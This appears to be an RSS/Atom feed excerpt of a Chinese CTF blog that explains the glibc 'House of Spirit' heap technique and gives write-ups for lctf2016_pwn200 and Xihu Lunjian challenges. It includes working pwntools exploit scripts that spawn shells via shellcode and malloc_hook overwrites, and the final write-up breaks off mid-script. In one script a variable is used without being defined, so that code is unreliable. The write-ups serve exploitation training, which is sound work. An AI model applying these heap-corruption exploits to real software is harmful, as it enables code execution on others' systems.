    <published>2020-10-09T03:45:32.518Z</published>
    <updated>2020-11-13T06:09:26.747Z</updated>
    
    <content type="html"><![CDATA[<h1 id="House-of-Spirit"><a href="#House-of-Spirit" class="headerlink" title="House of Spirit"></a>House of Spirit</h1><p>House of Spirit（下面称为hos）是一个组合型漏洞的利用，是变量覆盖和堆管理机制的组合利用，<strong>关键在于能够覆盖一个堆指针变量，使其指向可控的区域</strong>，只要构造好数据，释放后系统会错误的将该区域作为堆块放到相应的fastbin里面，最后再分配出来的时候，就有可能改写我们目标区域（多为函数指针和<strong>返回地址</strong>）。</p><h2 id="核心条件"><a href="#核心条件" class="headerlink" title="核心条件"></a>核心条件</h2><ul><li>有机会覆盖一个堆指针变量，使其指向目标可控的区域</li><li>能够在目标可控位置处伪造 fastbin chunk</li></ul><p>这样将其这个堆指针释放，会放到相应的fastbin，从而达到分配指定地址的 chunk 的目的。</p><h3 id="fastbin-fake-chunk-需要绕过的检测"><a href="#fastbin-fake-chunk-需要绕过的检测" class="headerlink" title="fastbin fake chunk 需要绕过的检测"></a>fastbin fake chunk 需要绕过的检测</h3><ul><li>fake chunk 的 ISMMAP 位不能为 1，因为 free 时，如果是 mmap 的 chunk，会单独处理。</li><li>fake chunk 地址需要对齐， <code>MALLOC_ALIGN_MASK</code></li><li>fake chunk 的 size 大小需要满足对应的 fastbin 的需求，同时也得对齐。</li><li>fake chunk 的 <strong>next chunk</strong> 的大小不能小于 <code>2 * SIZE_SZ</code>，同时也不能大于<code>av-&gt;system_mem</code> 。(这个大小还是很随意的，不必要非得是fastbin 的size 例如 :0x1234)</li><li>fake chunk 对应的 fastbin 链表头部不能是该 fake chunk，即不能构成 double free 的情况。</li></ul><h2 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h2><div class="hljs"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>&#123;    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">"This file demonstrates the house of spirit attack.n"</span>);  <span class="hljs-comment">//调用一次malloc来初始化堆  </span>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">"Calling malloc() once so that it sets up its memory.n"</span>);    <span class="hljs-built_in">malloc</span>(<span class="hljs-number">1</span>);  <span class="hljs-comment">//现在我们将覆写一个指针来指向一个伪造的fastbin域</span>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">"We will now overwrite a pointer to point to a fake 'fastbin' region.n"</span>);    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> <span class="hljs-keyword">long</span> *a;  <span class="hljs-comment">//这个和fastbinY无关,不要被这个10所骗,fake_chunks只是一块内存</span>    <span class="hljs-comment">// This has nothing to do with fastbinsY (do not be fooled by the 10) - fake_chunks is just a piece of memory to fulfil allocations (pointed to from fastbinsY)</span>    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> <span class="hljs-keyword">long</span> fake_chunks[<span class="hljs-number">10</span>] __attribute__ ((aligned (<span class="hljs-number">16</span>)));  <span class="hljs-comment">//这个域包含了两个chunk,第一个从fake_chunks[1]开始,另一个从fake_chunks[9]开始</span>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">"This region (memory of length: %lu) contains two chunks. The first starts at %p and the second at %p.n"</span>, <span class="hljs-keyword">sizeof</span>(fake_chunks), &amp;fake_chunks[<span class="hljs-number">1</span>], &amp;fake_chunks[<span class="hljs-number">9</span>]);  <span class="hljs-comment">//这个chunk的size必须符和fastbin的要求(&lt;=128 x64位系统),PREV_INUSE位在fasybin-sized chunks中也是被忽略的,但是IS_MAPPED和NON_MAIN_AREN会引发一些问题</span>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">"This chunk.size of this region has to be 16 more than the region (to accommodate the chunk data) while still falling into the fastbin category (&lt;= 128 on x64). The PREV_INUSE (lsb) bit is ignored by free for fastbin-sized chunks, however the IS_MMAPPED (second lsb) and NON_MAIN_ARENA (third lsb) bits cause problems.n"</span>);    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">"... note that this has to be the size of the next malloc request rounded to the internal size used by the malloc implementation. E.g. on x64, 0x30-0x38 will all be rounded to 0x40, so they would work for the malloc parameter at the end. n"</span>);    fake_chunks[<span class="hljs-number">1</span>] = <span class="hljs-number">0x40</span>; <span class="hljs-comment">// this is the size</span>  <span class="hljs-comment">//下一个fake chunk的size必须是合法的。 即&gt; 2 * SIZE_SZ（在x64上需要&gt; 16）和＆&lt;av-&gt; system_mem（对于main arena来说，默认为&lt;128kb）并且可以通过nextsize完整性检查。 但是我们无需符和Fastbin的大小</span>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">"The chunk.size of the *next* fake region has to be sane. That is &gt; 2*SIZE_SZ (&gt; 16 on x64) &amp;&amp; &lt; av-&gt;system_mem (&lt; 128kb by default for the main arena) to pass the nextsize integrity checks. No need for fastbin size.n"</span>);        <span class="hljs-comment">// fake_chunks[9] because 0x40 / sizeof(unsigned long long) = 8</span>    fake_chunks[<span class="hljs-number">9</span>] = <span class="hljs-number">0x1234</span>; <span class="hljs-comment">// nextsize</span>  <span class="hljs-comment">//现在我们将通过有着fake first chunks的fake区域地址来覆写我们的指针</span>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">"Now we will overwrite our pointer with the address of the fake region inside the fake first chunk, %p.n"</span>, &amp;fake_chunks[<span class="hljs-number">1</span>]);  <span class="hljs-comment">//要注意的是,chunk必须是16字节对齐的</span>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">"... note that the memory address of the *region* associated with this chunk must be 16-byte aligned.n"</span>);    a = &amp;fake_chunks[<span class="hljs-number">2</span>];    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">"Freeing the overwritten pointer.n"</span>);    <span class="hljs-built_in">free</span>(a);  <span class="hljs-comment">//现在下一次的malloc就将会返回我们的fake chunk了</span>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">"Now the next malloc will return the region of our fake chunk at %p, which will be %p!n"</span>, &amp;fake_chunks[<span class="hljs-number">1</span>], &amp;fake_chunks[<span class="hljs-number">2</span>]);    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">"malloc(0x30): %pn"</span>, <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x30</span>));&#125;</code></pre></div><p>正常的hos是需要伪造两个chunk的。</p><div class="hljs"><pre><code class="hljs c">This file demonstrates the house of spirit attack.Calling malloc() once so that it sets up its memory.We will now overwrite a pointer to point to a fake 'fastbin' region.This region (memory of length: 80) contains two chunks. The first starts at 0x7ffe23a56258 and the second at 0x7ffe23a56298.This chunk.size of this region has to be 16 more than the region (to accommodate the chunk data) while still falling into the fastbin category (&lt;= 128 on x64). The PREV_INUSE (lsb) bit is ignored by free for fastbin-sized chunks, however the IS_MMAPPED (second lsb) and NON_MAIN_ARENA (third lsb) bits cause problems.... note that this has to be the size of the next malloc request rounded to the internal size used by the malloc implementation. E.g. on x64, 0x30-0x38 will all be rounded to 0x40, so they would work for the malloc parameter at the end. The chunk.size of the *next* fake region has to be sane. That is &gt; 2*SIZE_SZ (&gt; 16 on x64) &amp;&amp; &lt; av-&gt;system_mem (&lt; 128kb by default for the main arena) to pass the nextsize integrity checks. No need for fastbin size.Now we will overwrite our pointer with the address of the fake region inside the fake first chunk, 0x7ffe23a56258.... note that the memory address of the *region* associated with this chunk must be 16-byte aligned.Freeing the overwritten pointer.Now the next malloc will return the region of our fake chunk at 0x7ffe23a56258, which will be 0x7ffe23a56260!malloc(0x30): 0x7ffe23a56260</code></pre></div><p>程序首先初始化了一下堆,然后申请了两个变量,一个是我们即将攻击的变量 a,另一个是我们的<code>fake_chunks</code></p><p>程序先在<code>fake_chunks[1]</code>的地方也就是size域伪造了合法的size,0x40(满足fastbin size大小,与16字节对齐,标志位正确)</p><p>之后又在下一处伪造了第二个chunk,即从<code>fake_chunks[8]</code>开始的地方,这是为什么呢,因为我们第一个fake chunk的size伪造成了0x40,那么我们第二个chunk就需要在向下0x40的地方也就是<code>fake_chunks+8</code>的地方伪造第二个chunk。</p><h3 id="小总结"><a href="#小总结" class="headerlink" title="小总结"></a>小总结</h3><p>使用该技术分配 chunk 到指定地址，使目标位置成为可控区域，关键是要能够修改指定地址的前后的内容，伪造出2个堆，使其可以绕过对应的检测。</p><p>还有就是要有办法覆盖堆指针，到目标地址。</p><h2 id="lctf2016-pwn200"><a href="#lctf2016-pwn200" class="headerlink" title="lctf2016_pwn200"></a><code>lctf2016_pwn200</code></h2><h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><ul><li>开头不输入<code>\n</code>，填充48字符可以泄露出stack地址</li><li>有第一段可控的栈，且可以覆盖到heap ptr</li></ul><div class="hljs"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">sub_400A29</span><span class="hljs-params">()</span></span>&#123;  <span class="hljs-keyword">char</span> buf; <span class="hljs-comment">// [rsp+0h] [rbp-40h]</span>  <span class="hljs-keyword">char</span> *dest; <span class="hljs-comment">// [rsp+38h] [rbp-8h]</span>  dest = (<span class="hljs-keyword">char</span> *)<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x40</span>uLL);  <span class="hljs-built_in">puts</span>(<span class="hljs-string">"give me money~"</span>);  read(<span class="hljs-number">0</span>, &amp;buf, <span class="hljs-number">0x40</span>uLL);  <span class="hljs-built_in">strcpy</span>(dest, &amp;buf);  ptr = dest;  <span class="hljs-keyword">return</span> sub_4009C4();&#125;</code></pre></div><ul><li>一次只能申请一个堆，大小0-0x80,且先释放才能再次申请。</li></ul><p>保护情况，无任何保护，所以可以写shellcode，jmp 上去即可。</p><h3 id="攻击思路"><a href="#攻击思路" class="headerlink" title="攻击思路"></a>攻击思路</h3><ul><li>利用可控的栈，hos 在栈上fake 一个堆，保证可以改到ret address</li></ul><p>可以先看一下可控栈的内存情况,<strong>此前id输入的是65</strong>：</p><p><img src="http://qiqianyun.chumen77.xyz/uPic/Sy4TQJ.png" srcset="/img/loading.gif" alt><br>前0x40为可控区域，箭头指的方向是可以覆盖的堆指针，id的上方有一个ret address，其在输入3退出时可以跳转到。所以其为目标地址，其前面有可控的0x40的区域，后面也有一个id 0x8的可控区域，满足条件 开始构造：</p><p><img src="http://qiqianyun.chumen77.xyz/uPic/fO0l4K.png" srcset="/img/loading.gif" alt></p><p>这样free一下就会有个进入fastbin 在栈上的fake堆，申请上去即可修改到目标区域。</p><ul><li>修改ret addree为shellcode的地址。其可以在第一次让你输入时，放入栈中。</li></ul><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><div class="hljs"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python</span><span class="hljs-comment"># encoding: utf-8</span><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<span class="hljs-keyword">import</span> timelocal_file  = <span class="hljs-string">'./pwn200'</span>elf = ELF(local_file)context.log_level = <span class="hljs-string">'debug'</span>debug = <span class="hljs-number">0</span><span class="hljs-keyword">if</span> debug:    io = process(local_file)    libc = elf.libc<span class="hljs-keyword">else</span>:    io = remote(<span class="hljs-string">'node3.buuoj.cn'</span>,<span class="hljs-number">26670</span>)    libc = elf.libc    <span class="hljs-comment">#libc = ELF('.')</span>context.arch = elf.archcontext.terminal = [<span class="hljs-string">'tmux'</span>,<span class="hljs-string">'neww'</span>]<span class="hljs-comment">#,''splitw','-h'</span>s      = <span class="hljs-keyword">lambda</span> data               :io.send(data) sa      = <span class="hljs-keyword">lambda</span> delim,data         :io.sendafter(delim, data)sl      = <span class="hljs-keyword">lambda</span> data               :io.sendline(data)sla     = <span class="hljs-keyword">lambda</span> delim,data         :io.sendlineafter(delim, data)r      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :io.recv(numb)ru      = <span class="hljs-keyword">lambda</span> delims, drop=<span class="hljs-literal">True</span>  :io.recvuntil(delims, drop)uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">'\0'</span>))uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">'\0'</span>))info_addr = <span class="hljs-keyword">lambda</span> tag, addr        :io.info(tag + <span class="hljs-string">'==&gt;'</span> +<span class="hljs-string">': &#123;:#x&#125;'</span>.format(addr))itr     = <span class="hljs-keyword">lambda</span>                    :io.interactive()<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span><span class="hljs-params">()</span>:</span>    <span class="hljs-comment"># gdb.attach(proc.pidof(io)[0],gdbscript='b main')</span>    gdb.attach(io)    pause()<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span><span class="hljs-params">(size,data)</span>:</span>    sla(<span class="hljs-string">'choice'</span>,<span class="hljs-string">'1'</span>)    sla(<span class="hljs-string">'long'</span>,str(size))    sa(<span class="hljs-string">'me'</span>,str(data))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">free</span><span class="hljs-params">()</span>:</span>    sla(<span class="hljs-string">'choice'</span>,<span class="hljs-string">'2'</span>)shellcode = asm(shellcraft.sh())sa(<span class="hljs-string">'u'</span>,shellcode)ru(<span class="hljs-string">'\x05'</span>)leak_stack = uu64(r(<span class="hljs-number">6</span>))info_addr(<span class="hljs-string">'leak_stack'</span>,leak_stack)shellcode_addr = leak_stack - <span class="hljs-number">0x50</span><span class="hljs-comment"># debug()</span>sla(<span class="hljs-string">'id'</span>,<span class="hljs-string">'65'</span>)payload = p64(<span class="hljs-number">0</span>)*<span class="hljs-number">5</span> + p64(<span class="hljs-number">0x41</span>) + p64(<span class="hljs-number">0</span>) + p64(leak_stack - <span class="hljs-number">0x90</span>)sa(<span class="hljs-string">'money'</span>,payload)free()payload = p64(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span> + p64(shellcode_addr)add(<span class="hljs-number">0x38</span>,payload)sleep(<span class="hljs-number">0.2</span>)sla(<span class="hljs-string">'choice'</span>,<span class="hljs-string">'3'</span>)<span class="hljs-comment"># debug()</span>itr()</code></pre></div><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://www.anquanke.com/post/id/199468#h2-19" target="_blank" rel="noopener">https://www.anquanke.com/post/id/199468#h2-19</a><br><a href="https://www.anquanke.com/post/id/85357" target="_blank" rel="noopener">https://www.anquanke.com/post/id/85357</a><br><a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/fastbin_attack-zh/#house-of-spirit" target="_blank" rel="noopener">https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/fastbin_attack-zh/#house-of-spirit</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;House-of-Spirit&quot;&gt;&lt;a href=&quot;#House-of-Spirit&quot; class=&quot;headerlink&quot; title=&quot;House of Spirit&quot;&gt;&lt;/a&gt;House of Spirit&lt;/h1&gt;&lt;p&gt;House of Spirit（下面
      
    
    </summary>
    
    
      <category term="pwn" scheme="http://chumen77.xyz/tags/pwn/"/>
    
      <category term="House系列" scheme="http://chumen77.xyz/tags/House%E7%B3%BB%E5%88%97/"/>
    
      <category term="heap" scheme="http://chumen77.xyz/tags/heap/"/>
    
  </entry>
  
  <entry>
    <title>西湖论剑部分wp</title>
    <link href="http://chumen77.xyz/2020/10/09/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91%E9%83%A8%E5%88%86wp/"/>
    <id>http://chumen77.xyz/2020/10/09/西湖论剑部分wp/</id>
    <published>2020-10-09T00:23:05.599Z</published>
    <updated>2020-10-14T15:43:53.754Z</updated>
    
    <content type="html"><![CDATA[<h1 id="西湖论剑部分wp"><a href="#西湖论剑部分wp" class="headerlink" title="西湖论剑部分wp"></a>西湖论剑部分wp</h1><h2 id="mmutag"><a href="#mmutag" class="headerlink" title="mmutag"></a>mmutag</h2><h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><ul><li>给了一个栈地址</li><li>没有show函数</li><li>free 函数存在uaf</li><li>add函数只能申请堆号为1-10的堆块，大小仅为0x68</li><li>可以给栈上读一段数据</li></ul><div class="hljs"><pre><code class="hljs c"><span class="hljs-keyword">char</span> buf; <span class="hljs-comment">// [rsp+10h] [rbp-20h]</span></code></pre></div><div class="hljs"><pre><code class="hljs c"><span class="hljs-keyword">if</span> ( v3 != <span class="hljs-number">3</span> )      <span class="hljs-keyword">break</span>;    read(<span class="hljs-number">0</span>, &amp;buf, <span class="hljs-number">0x20</span>uLL);    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Your content: %s\n"</span>, &amp;buf);</code></pre></div><p>利用这个可以泄漏栈上的数据，也可以在栈上写一定的数据。</p><h3 id="难点"><a href="#难点" class="headerlink" title="难点"></a>难点</h3><p>如何泄漏libc地址。</p><p>栈上是有很多数据的，可以用choice 3进行泄漏一定的数据，但是由于<code>\x00</code>的截断，泄漏一个stack地址后，其后有用的libc地址没办法泄漏。</p><p>看下其栈情况：</p><p><img src="http://qiqianyun.chumen77.xyz/uPic/IqyiLw.png" srcset="/img/loading.gif" alt><br>可控区域0x20，如果可以填充其中无用的数据到libc地址，再利用一次 choice 3 即可完成泄漏。</p><p>现在也已经知道了stack的地址。伪造一个0x70的堆，然后fastbin attack即可申请到这栈上的内存。然后填充，获取libc地址。接着攻击malloc hook即可。</p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><div class="hljs"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python</span><span class="hljs-comment"># encoding: utf-8</span><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<span class="hljs-keyword">import</span> timelocal_file  = <span class="hljs-string">'./mmutag'</span>elf = ELF(local_file)context.log_level = <span class="hljs-string">'debug'</span>debug = <span class="hljs-number">0</span><span class="hljs-keyword">if</span> debug:    io = process(local_file)    libc = elf.libc<span class="hljs-keyword">else</span>:    io = remote(<span class="hljs-string">'183.129.189.61'</span>,<span class="hljs-number">55704</span>)    libc = elf.libc    <span class="hljs-comment">#libc = ELF('.')</span>context.arch = elf.archcontext.terminal = [<span class="hljs-string">'tmux'</span>,<span class="hljs-string">'neww'</span>]<span class="hljs-comment">#,''splitw','-h'</span>rce16 = [<span class="hljs-number">0x45216</span>,<span class="hljs-number">0x4526a</span>,<span class="hljs-number">0xf02a4</span>,<span class="hljs-number">0xf1147</span>]rce18 = [<span class="hljs-number">0x4f2c5</span>,<span class="hljs-number">0x4f322</span>,<span class="hljs-number">0x10a38c</span>]realloc = [<span class="hljs-number">0x2</span>,<span class="hljs-number">0x4</span>,<span class="hljs-number">0x6</span>,<span class="hljs-number">0xB</span>,<span class="hljs-number">0xC</span>,<span class="hljs-number">0xD</span>]arae18 = <span class="hljs-number">0x3ebca0</span>s      = <span class="hljs-keyword">lambda</span> data               :io.send(data) sa      = <span class="hljs-keyword">lambda</span> delim,data         :io.sendafter(delim, data)sl      = <span class="hljs-keyword">lambda</span> data               :io.sendline(data)sla     = <span class="hljs-keyword">lambda</span> delim,data         :io.sendlineafter(delim, data)r      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :io.recv(numb)ru      = <span class="hljs-keyword">lambda</span> delims, drop=<span class="hljs-literal">True</span>  :io.recvuntil(delims, drop)uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">'\0'</span>))uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">'\0'</span>))info_addr = <span class="hljs-keyword">lambda</span> tag, addr        :io.info(tag + <span class="hljs-string">'==&gt;'</span> +<span class="hljs-string">': &#123;:#x&#125;'</span>.format(addr))itr     = <span class="hljs-keyword">lambda</span>                    :io.interactive()<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span><span class="hljs-params">()</span>:</span>    <span class="hljs-comment"># gdb.attach(proc.pidof(io)[0],gdbscript='b main')</span>    gdb.attach(io)    pause()<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">input_introduce</span><span class="hljs-params">(data)</span>:</span>    sla(<span class="hljs-string">'your introduce'</span>,str(data))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span><span class="hljs-params">(idx,data)</span>:</span>    sla(<span class="hljs-string">'ise'</span>,<span class="hljs-string">'1'</span>)    sla(<span class="hljs-string">'id'</span>,str(idx))    sa(<span class="hljs-string">'tent'</span>,str(data))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">free</span><span class="hljs-params">(idx)</span>:</span>    sla(<span class="hljs-string">'ise'</span>,<span class="hljs-string">'2'</span>)    sla(<span class="hljs-string">'id'</span>,str(idx))data = <span class="hljs-string">'1'</span> * <span class="hljs-number">0x60</span>sa(<span class="hljs-string">'name'</span>,data)ru(<span class="hljs-string">'0x'</span>)leak_libc = int(r(<span class="hljs-number">12</span>),<span class="hljs-number">16</span>)sla(<span class="hljs-string">'ice'</span>,<span class="hljs-string">'2'</span>)add(<span class="hljs-number">1</span>,<span class="hljs-string">'chumen77'</span>)add(<span class="hljs-number">2</span>,<span class="hljs-string">'chumen77'</span>)free(<span class="hljs-number">1</span>)free(<span class="hljs-number">2</span>)free(<span class="hljs-number">1</span>)sla(<span class="hljs-string">'ise'</span>,<span class="hljs-string">'3'</span>)payload = p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x70</span>) + p64(<span class="hljs-number">0</span>)s(payload)add(<span class="hljs-number">4</span>,p64(leak_stack - <span class="hljs-number">0x40</span>))add(<span class="hljs-number">5</span>,<span class="hljs-string">'1'</span>)add(<span class="hljs-number">6</span>,<span class="hljs-string">'1'</span>)add(<span class="hljs-number">7</span>,<span class="hljs-string">'1'</span> * <span class="hljs-number">0x47</span> + <span class="hljs-string">'2'</span>)sla(<span class="hljs-string">'ise'</span>,<span class="hljs-string">'3'</span>)s(<span class="hljs-string">'1'</span> * <span class="hljs-number">0x20</span>)info_addr(<span class="hljs-string">'leak-stack'</span>,leak_stack)ru(<span class="hljs-string">'2'</span>)libc_base = uu64(r(<span class="hljs-number">6</span>)) - <span class="hljs-number">0x20840</span>info_addr(<span class="hljs-string">'libc_base'</span>,libc_base)free(<span class="hljs-number">1</span>)free(<span class="hljs-number">2</span>)free(<span class="hljs-number">1</span>)malloc_hook  = <span class="hljs-number">0x3c4aed</span> + libc_baseadd(<span class="hljs-number">3</span>,p64(malloc_hook))add(<span class="hljs-number">8</span>,<span class="hljs-string">'1'</span>)add(<span class="hljs-number">9</span>,<span class="hljs-string">'1'</span>)one = <span class="hljs-number">0xf0364</span> + libc_basepayload = (<span class="hljs-number">3</span> + <span class="hljs-number">0x10</span>) * <span class="hljs-string">'\x00'</span> + p64(one)add(<span class="hljs-number">10</span>,payload)free(<span class="hljs-number">3</span>)free(<span class="hljs-number">3</span>)<span class="hljs-comment"># debug()</span>itr()</code></pre></div><p>最后因为没有堆可以申请，可以故意触发报错，其会调用到malloc来储存部分数据，此时也就可以get shell。</p><h2 id="ezhttp"><a href="#ezhttp" class="headerlink" title="ezhttp"></a>ezhttp</h2><p>看起来较为复杂，因为实现了一个对Http packet的交互，让我这种不是很熟悉http packet，coding能力差的人，逆向起来有点吃力。</p><h3 id="分析-1"><a href="#分析-1" class="headerlink" title="分析"></a>分析</h3><h4 id="前置技能"><a href="#前置技能" class="headerlink" title="前置技能"></a>前置技能</h4><ul><li>简易的Http packet结构</li><li><code>setcontext</code> 函数的exploit</li><li>各种不熟悉的字符串处理函数<code>sscanf strchr strtok</code> </li></ul><h4 id="程序分析"><a href="#程序分析" class="headerlink" title="程序分析"></a>程序分析</h4><ul><li>开头初始化，开启了沙箱，只能orw来获取flag</li><li>add函数，以输入的字符数量来给你分配堆，所以<code>\x00</code>用不了了，最大0x100，且给了heap的地址</li><li>del 函数，存在uaf</li><li>无show函数</li><li>edit函数，可以输入<code>\x00</code>的字符，无vul</li></ul><h3 id="攻击思路"><a href="#攻击思路" class="headerlink" title="攻击思路"></a>攻击思路</h3><ul><li>free 0x100的chunk 8次，使其进入unsortbin，留着攻击stdout</li><li>tcache attack 攻击到<code>_IO_2_1_stdout_</code> ，使其泄漏libc地址</li><li>tcache attack 攻击free hook，写上setcontext + 53 ，准备srop进行攻击</li><li>srop读入mprotect的rop chain，开启heap段的执行权限</li><li>edit 一个heap的内存为 orw flag</li><li>触发free hook，orw get flag</li></ul><h3 id="细节集合"><a href="#细节集合" class="headerlink" title="细节集合"></a>细节集合</h3><h4 id="对于stdout的攻击"><a href="#对于stdout的攻击" class="headerlink" title="对于stdout的攻击"></a>对于stdout的攻击</h4><p>其中，在利用libc残留伪造stdout地址作为fd的时候，只要改3字节，其肯定是申请的0x20的堆，但是上stdout结构体时需要0x21字节的写入。<br>tcache分配中，并不验证堆的大小，只要fd指好就OK了，所以申请个至少可以写入0x21字节的堆即可。但是由于程序分配chunk的策略，申请时肯定要写数据，写什么不会crush。个人做的时候,乱填充数据，crush了很多次，头都炸了。可以看一下<code>_IO_2_1_stdout_</code>结构体：</p><div class="hljs"><pre><code class="hljs undefined">pwndbg&gt; ptype stdout<span class="hljs-built_in">type</span> = struct <span class="hljs-variable">_IO_FILE</span> &#123;    int <span class="hljs-variable">_flags</span>;    char *<span class="hljs-variable">_IO_read_ptr</span>;    char *<span class="hljs-variable">_IO_read_end</span>;    char *<span class="hljs-variable">_IO_read_base</span>;    char *<span class="hljs-variable">_IO_write_base</span>;      char *<span class="hljs-variable">_IO_write_ptr</span>;       char *<span class="hljs-variable">_IO_write_end</span>;    char *<span class="hljs-variable">_IO_buf_base</span>;    char *<span class="hljs-variable">_IO_buf_end</span>;    char *<span class="hljs-variable">_IO_save_base</span>;    char *<span class="hljs-variable">_IO_backup_base</span>;    char *<span class="hljs-variable">_IO_save_end</span>;    struct <span class="hljs-variable">_IO_marker</span> *<span class="hljs-variable">_markers</span>;    struct <span class="hljs-variable">_IO_FILE</span> *<span class="hljs-variable">_chain</span>;    int <span class="hljs-variable">_fileno</span>;    int <span class="hljs-variable">_flags2</span>;    <span class="hljs-variable">__off_t</span> <span class="hljs-variable">_old_offset</span>;    unsigned short <span class="hljs-variable">_cur_column</span>;    signed char <span class="hljs-variable">_vtable_offset</span>;    char <span class="hljs-variable">_shortbuf</span>[<span class="hljs-number">1</span>];    <span class="hljs-variable">_IO_lock_t</span> *<span class="hljs-variable">_lock</span>;    <span class="hljs-variable">__off64_t</span> <span class="hljs-variable">_offset</span>;    struct <span class="hljs-variable">_IO_codecvt</span> *<span class="hljs-variable">_codecvt</span>;    struct <span class="hljs-variable">_IO_wide_data</span> *<span class="hljs-variable">_wide_data</span>;    struct <span class="hljs-variable">_IO_FILE</span> *<span class="hljs-variable">_freeres_list</span>;    void *<span class="hljs-variable">_freeres_buf</span>;    size_t <span class="hljs-variable">__pad5</span>;    int <span class="hljs-variable">_mode</span>;    char <span class="hljs-variable">_unused2</span>[<span class="hljs-number">20</span>];&#125; *</code></pre></div><p>在学习io file相关知识时，可以了解到对于获取和输出信息，很重要的就是开头<code>_flags</code> ，其决定了此时io的状况。</p><p>其中注意到<code>_flags</code> 大小是int型，所以在libc地址其读取和验证将要做什么时，是以int的宽度来获取的。所以设置对低位8字节即可。比如<code>0xfffffffffbad3c80</code> <code>0x12345678fbad3c80</code> ,剩下的就好说了，全弄成<code>a</code>的垃圾字符堆。</p><p>然后再次edit，这个<code>_IO_2_1_stdout_</code>即可泄漏出libc地址。</p><h4 id="改free-hook写setcontext时的细节"><a href="#改free-hook写setcontext时的细节" class="headerlink" title="改free hook写setcontext时的细节"></a>改free hook写setcontext时的细节</h4><p>其中需要注意一下libc版本，在最低的libc 2.27版本中，其经常是以<code>0xXXXXXXX00a0</code>这样的存在。直接改写时，<code>/x00</code>被截断，写不上free hook。然后想着用edit 进行修改。但是会发现，此时坏的free hook情况下，用edit直接crush。</p><p>考虑升级一下libc版本号对应对赛题服务器的libc版本，但是libc2.27最近更新了，直接<code>apt upgrade libc6</code> 就会升级到libc 2.27:1.3最新版本，其增加了对double free的检测，就直接做不了了。</p><p>apt 指定版本的升级：</p><div class="hljs"><pre><code class="hljs undefined">apt-cache madison libc6                  apt-<span class="hljs-builtin-name">get</span> install <span class="hljs-attribute">libc6</span>=2.27-3ubuntu1.2 apt-cache madison libc6-dbgapt-<span class="hljs-builtin-name">get</span> install <span class="hljs-attribute">libc6-dbg</span>=2.27-3ubuntu1.2</code></pre></div><p>这样就升级好了，并且解决了个人写setcontext的问题，因为其地址没有再有``x00<div class="hljs"><pre><code class="hljs 。">### exp```python#!/usr/bin/env python# encoding: utf-8from pwn import *import timelocal_file  = &apos;./ezhttp&apos;elf = ELF(local_file)context.log_level = &apos;debug&apos;debug = 1if debug:    io = process(local_file)    libc = elf.libcelse:    io = remote(&apos;172.17.0.2&apos;,23946)    libc = 